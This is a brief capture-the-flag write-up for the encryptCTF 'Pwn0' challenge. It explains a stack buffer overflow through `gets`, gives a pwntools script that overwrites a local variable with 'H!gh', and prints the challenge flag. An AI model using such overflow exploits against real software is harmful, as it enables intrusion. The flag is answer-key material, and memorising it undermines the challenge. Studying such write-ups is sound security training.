# Pwn0
### 📄 Description
How is the Josh?

### ⚙ How to run it
```bash
./pwn0
```
<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>
    
We see that is used `gets` to read the string. We can exploit this fact to overwrite the `josh` variable with the required string `H!gh`.

```python
from pwn import *

context.binary = "./pwn0"

p = process()
p.sendline(b"A" * 64 + b"H!gh")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```


<h3> 🚩 Flag </h3>

```plain
encryptCTF{L3t5_R4!53_7h3_J05H}
```
</details>